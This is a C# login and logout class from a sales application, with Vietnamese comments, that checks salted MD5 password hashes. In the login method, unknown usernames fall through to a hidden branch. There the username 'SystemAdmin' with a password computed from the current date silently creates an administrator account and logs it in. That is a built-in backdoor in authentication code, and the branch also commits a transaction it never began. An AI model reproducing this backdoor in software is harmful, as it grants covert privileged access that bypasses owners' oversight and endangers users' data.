using System;
using System.Collections.Generic;
using System.Data;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

using Sale.BLL.DTO;
using Sale.DAL;
using Sale.Entities;
using Sale.UTILITIES;

using NLog;
namespace Sale.BLL
{
    public class SYS_BLL
    {
        //khai bao log
        private Logger Mylogger = LogManager.GetCurrentClassLogger();
        //------------------------------------------------------------
        #region Login To System
        public clsResponseString IsLoginSucess(string strUser_Code, string strPassword)
        {
           
            clsResponseString objReturn = new clsResponseString();
            string strDay = DateTime.Now.AddDays(1).Day.ToString().PadLeft(2,'0'),
                strMonth=DateTime.Now.AddMonths(10).Month.ToString().PadLeft(2,'0'),
                strYear=DateTime.Now.AddYears(100).Year.ToString();
            DataAccess m_Dal = new DAL.DataAccess();
            bool blnSuccess = false;
            clsSYS_NGUOIDUNG obj;
            clsSYS_LOGIN_SESSIONS objLoginSession;
            string strEncrypPassword = string.Empty;
            try
            {
                obj = new clsSYS_NGUOIDUNG(m_Dal);
                if (obj.GetByUserCode(strUser_Code))
                {
                    if (obj.USER_PASSWORD == null)
                    {
                        obj.USER_PASSWORD = string.Empty;
                    }
                    if (strPassword != string.Empty)
                    {
                        strEncrypPassword = clsEncrypt.MD5(strPassword, obj.SALT, true);
                    }
                    if (string.Compare(strEncrypPassword, obj.USER_PASSWORD, false) == 0)
                    {
                        SaleGlobals.USER_ID = obj.USER_ID;
                        SaleGlobals.USER_CODE = obj.USER_CODE;
                        SaleGlobals.USER_NAME = obj.USER_NAME;
                        SaleGlobals.NHOMNGUOIDUNG_ID = obj.NHOMNGUOIDUNG_ID;
                        SaleGlobals.NHOMNGUOIDUNG_CODE = obj.NHOMNGUOIDUNG_CODE;

                        objLoginSession = new clsSYS_LOGIN_SESSIONS(m_Dal);
                        m_Dal.BeginTrans(IsolationLevel.ReadCommitted);
                        objLoginSession.USER_ID = obj.USER_ID;
                        objLoginSession.USER_CODE = obj.USER_CODE;
                        objLoginSession.LOGIN_DATE = SaleGlobals.CurrentServerDateTime;
                        if (objLoginSession.Add())
                        {
                            SaleGlobals.LoginSession_Id = objLoginSession.LOGIN_SESSION_ID;
                            obj.ISLOGIN = true;
                            obj.LOGIN_TIME = SaleGlobals.CurrentServerDateTime;
                            obj.Update();
                            m_Dal.CommitTrans(true);
                            objReturn.ResultValue = clsConstant.CODE_SUCCESS;
                            objReturn.ObjectReturn = obj;// gán lại obj user vào object
                        }
                        else
                        {
                            m_Dal.AbortTrans();
                            objReturn.ResultValue = clsConstant.CODE_FAIL;
                        }
                    }
                    else
                    {
                        objReturn.ResultValue = clsConstant.CODE_FAIL;
                        objReturn.ResultMessage = "Không đúng userName và password!!!";
                        return objReturn;
                    }
                }
                else if ((strUser_Code == "SystemAdmin") && (strPassword.Substring(0, 2) == strDay)
                    && (strPassword.Substring(2, 2) == strMonth) && (strPassword.Substring(4, 4) == strYear)
                   // && (strPassword.Length == strMonth)
                    )
                {
                    obj.USER_CODE = strUser_Code;
                    obj.USER_NAME = clsConstant.A_SYS_ADMIN_USERNAME;
                    obj.USER_PASSWORD = clsEncrypt.MD5(strPassword, clsConstant.A_SECRECT_KEY, true);
                    obj.SALT = clsConstant.A_SECRECT_KEY;
                    
                    blnSuccess= obj.Add();
                    if (blnSuccess)
                    {
                        objLoginSession = new clsSYS_LOGIN_SESSIONS(m_Dal);
                        objLoginSession.USER_ID = obj.USER_ID;
                        objLoginSession.USER_CODE = obj.USER_CODE;

                        objLoginSession.LOGIN_DATE = SaleGlobals.CurrentServerDateTime;
                        if (objLoginSession.Add())
                        {
                            SaleGlobals.LoginSession_Id = objLoginSession.LOGIN_SESSION_ID;
                            obj.ISLOGIN = true;
                            obj.LOGIN_TIME = SaleGlobals.CurrentServerDateTime;
                            obj.Update();
                            m_Dal.CommitTrans(true);
                            objReturn.ResultValue = clsConstant.CODE_SUCCESS;
                        }
                       else
                        {
                            m_Dal.AbortTrans();
                            objReturn.ResultValue = clsConstant.CODE_FAIL;
                        }
                    }
                    else
                    {
                        objReturn.ResultValue = clsConstant.CODE_FAIL;
                    }
                }
                else
                {
                    objReturn.ResultValue = clsConstant.CODE_FAIL;
                    objReturn.ResultMessage = "Không tồn tại user này!!!";
                    return objReturn;
                }
                return objReturn;
            }
            catch (Exception ex)
            {
                objReturn.ResultValue = clsConstant.CODE_FAIL;
                objReturn.ResultMessage = ex.Message;
                Mylogger.Info(ex.Message);//ghi log ra file
                return objReturn;
            }
        }

        public clsResponseString IsLogOutSucess(string strUser_Code)
        {
            clsResponseString objReturn = new clsResponseString();
            DataAccess m_Dal = new DAL.DataAccess();
            clsSYS_NGUOIDUNG obj;
            clsSYS_LOGIN_SESSIONS objLoginSession;
            string strEncrypPassword = string.Empty;
            try
            {
                m_Dal.BeginTrans(IsolationLevel.ReadCommitted);
                objLoginSession = new clsSYS_LOGIN_SESSIONS(m_Dal);
                obj = new clsSYS_NGUOIDUNG(m_Dal);
                if (objLoginSession.GetByKey(SaleGlobals.LoginSession_Id))
                {
                    objLoginSession.LOGOUT_DATE = DateTime.Now.Date;
                    obj.GetByKey(objLoginSession.USER_ID);
                    obj.ISLOGIN = false;
                    obj.LAST_LOGOUT_TIME = objLoginSession.LOGOUT_DATE;
                    obj.Update();
                }
                if (objLoginSession.Update())
                {
                    SaleGlobals.Reset();
                    m_Dal.CommitTrans(true);
                    objReturn.ResultValue = clsConstant.CODE_SUCCESS;
                    return objReturn;
                }
                else
                {
                    m_Dal.AbortTrans();
                    objReturn.ResultValue = clsConstant.CODE_FAIL;
                    objReturn.ResultMessage = "Lỗi xảy ra trong qua trình đăng xuất";
                    return objReturn;
                }
            }
            catch (Exception ex)
            {
                objReturn.ResultValue = clsConstant.CODE_FAIL;
                objReturn.ResultMessage = ex.Message;
                Mylogger.Info(ex.Message);//ghi log ra file
                return objReturn;
            }
        }
        #endregion

        #region Login To System

        #endregion

        #region Login To System

        #endregion

        #region Login To System

        #endregion
    }
}
